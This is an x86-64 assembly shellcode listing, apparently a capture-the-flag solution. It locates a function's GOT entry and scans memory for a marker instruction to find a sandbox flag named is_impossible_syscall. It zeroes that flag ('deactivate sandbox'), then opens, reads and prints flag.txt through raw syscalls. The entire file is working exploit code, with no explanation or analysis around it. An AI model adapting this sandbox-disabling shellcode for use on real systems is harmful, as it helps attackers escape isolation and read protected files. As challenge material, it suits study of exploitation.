global _start
_start:
  jmp string

code:
  pop rsi ; save string
  
  mov rbx, 0 ; init
  mov rax, 0x304a80418 ; perror got
  mov rax, [rax]
  and rax, 0xfffffffffffff000
  sub rax, 0xad0000 ; offset 

loop:
  mov ebx, [rax]
  cmp ebx, 0x69fe8148 ; cmp rdi, 31337
  jz done
  add rax, 1
  jmp loop
  
done:
  xor rbx, rbx
  add rax, 9 ; current address
  add rax, 2
  mov ebx, [rax] ; offset
  add rax, 8 ; end of instruction
  add rax, rbx ; ok get is_impossible_syscall

  mov rbx, 0
  mov [rax], rbx ; deactivate sandbox

  mov     rdi, rsi
  mov     rsi, 0
  mov     rax, 2
  syscall ; open

  mov     rdi, rax
  sub     rsp, 0x1000 ; buffering
  mov     rsi, rsp
  mov     rdx, 0x1000
  mov     rax, 0
  syscall ; read

  mov     rdi, 1
  mov     rax, 1
  syscall ; write

string:
  call code
db  'flag.txt',0x00
